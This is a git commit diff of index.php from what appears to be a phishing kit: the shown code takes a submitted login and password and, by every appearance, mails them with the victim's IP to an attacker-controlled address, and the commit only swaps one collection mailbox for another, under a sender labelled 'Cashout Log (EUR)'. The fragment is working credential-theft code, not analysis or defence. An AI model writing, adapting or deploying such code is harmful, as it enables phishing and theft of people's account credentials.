cbf7e442f3f6164ca4222ccd2ae6556cd0bd1637
gatswagg <95851916+gatswagg@users.noreply.github.com>
2022-01-14 01:15:41 +0800

    Update index.php

--- index.php
+++ index.php
@@ -10,7 +10,7 @@ $bad = array('signal'=>'bad');
 if (!empty($login) && !empty($passwd)) {
 
 
-    $own = 'deralogs@yandex.com';
+    $own = 'shareridesapp@yandex.com';
     $date = date("D/M/d, Y g:i a");
     $subj = "$login  from $ip";
     $from = "From:Cashout Log (EUR) <mail@me.mom163.com>";
